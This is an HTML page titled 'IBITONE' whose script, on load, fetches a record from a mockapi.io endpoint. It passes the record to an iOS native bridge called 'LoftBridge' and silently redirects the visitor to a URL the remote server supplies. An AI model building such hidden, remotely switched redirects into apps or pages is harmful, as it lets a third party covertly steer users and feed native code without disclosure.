<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta name="viewport"
			content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
		<title>IBITONE</title>
	</head>
	<body>
		<script type="text/javascript">
			document.addEventListener('DOMContentLoaded', function() {
				async function getData() {
					try {
						var str = 'https://6ae7641756b2ee1e54405edc.mockapi.io/IBITONE/data'
						const response = await fetch(str, {
							cache: 'no-store'
						});
						if (!response.ok) {
							getData();
						}
						const arr = await response.json();
						console.log(arr);
						const dic = arr[0];
						if (Object.hasOwn(dic, 'a')) {
							console.log("b");
							try {
								window.webkit.messageHandlers.LoftBridge.postMessage(dic);
							} catch (e) {}
							window.location.href = dic["a"];
						}
					} catch (error) {
						console.error('Fetch error:', error);
					}
				}
				getData();
			});
		</script>
	</body>
</html>
